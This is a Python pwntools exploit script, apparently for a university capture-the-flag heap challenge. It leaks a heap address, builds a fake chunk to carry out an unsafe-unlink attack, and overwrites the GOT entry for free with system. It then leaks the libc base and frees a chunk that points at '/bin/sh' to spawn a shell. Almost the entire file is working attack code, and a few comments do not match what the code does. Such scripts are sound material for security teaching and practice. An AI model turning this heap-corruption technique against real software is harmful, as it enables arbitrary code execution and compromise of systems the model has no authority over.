#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm code
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set max-visualize-chunk-size 0x100
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-road.chals.io", 443, ssl=True, sni="cse4850-road.chals.io")
    else:
        return process(binary)

def create(p):
    p.sendlineafter(b"choice:", b"1")

def edit(p,index,data):
    p.sendlineafter(b"choice:", b"2")
    p.sendlineafter(b"):", index)
    p.sendlineafter(b"container:", data)

def delete(p,index):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"):", index)

def view(p,index):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"):", index)

def leak_libc(p,e,l):
    # Free the second chunk and read the bk 
     
    view(p,"0")

    p.recvuntil(b"at ")
    heap_leak = int(p.recvline().strip(),16)

    log.info(f"Leaked heap at {hex(heap_leak)}")

    create(p)
    create(p)
    create(p)
    create(p)
    create(p)
    log.info(f"Created three chunks")


    # Create a fake chunk so that P->bk->fd == P and P->fd->bk == P 
    edit(p, b"4", p64(0) + p64(0x91) + p64(heap_leak) + p64(heap_leak+0x8) + b"B" * 0x70 + p64(0x90) + b"\xa0")
    view(p, b"1") 
    pause()
    delete(p, b"5")
    
    pause()
    # Edit 1st bin to be 
    edit(p, b"4", p64(e.got["free"]))
    view(p, b"1")

    p.recvuntil(b"contents:\n")
    leak = u64(p.recv(6).ljust(8, b"\x00"))


    libc_base = leak - l.sym["free"]
    l.address = libc_base
    log.info(f"Leaked libc base {hex(libc_base)} from main arena")
    log.info(f"Leaked libc address {hex(leak)} from main arena")


def malloc_hook(p,e,l):

    edit(p, b"4", p64(e.got["free"]) + p64(next(l.search(b"/bin/sh\x00"))))
    edit(p, b"1", p64(l.sym["system"]) + p64(l.sym["puts"]))
    delete(p, b"2")
    
    p.interactive()


def fsop(p,e,l,h):
    return None

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    leak_libc(p,e,l)
    malloc_hook(p,e,l)
